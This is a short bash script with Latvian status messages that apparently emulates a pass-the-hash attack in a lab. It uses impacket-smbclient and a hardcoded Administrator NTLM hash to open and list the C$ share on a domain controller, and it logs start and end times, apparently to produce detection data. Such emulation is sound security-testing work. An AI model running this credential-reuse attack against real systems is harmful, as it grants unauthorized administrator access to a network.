#!/bin/bash

set -euo pipefail

ADMINISTRATOR_NTLM="aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b"
DOMAIN="LAB"
DC_IP="10.99.10.10"
SCENARIO_ID="${1:-passthehash_impacket}"
LOG_FILE="scenario.log"

START_TIME="$(date -Is)"
echo "${START_TIME},scenario=${SCENARIO_ID},type=passthehash,status=start,domain=${DOMAIN},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${START_TIME}: Sākts Pass-the-Hash scenārijs ${SCENARIO_ID}"
echo "[*] Domēns: ${DOMAIN} DC: ${DC_IP}"

echo -e "use C$\nls\nexit" | impacket-smbclient -hashes ${ADMINISTRATOR_NTLM} ${DOMAIN}/Administrator@${DC_IP}

END_TIME="$(date -Is)"
echo "${END_TIME},scenario=${SCENARIO_ID},type=passthehash,status=end,domain=${DOMAIN},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${END_TIME}: Pabeigts scenārijs ${SCENARIO_ID}"

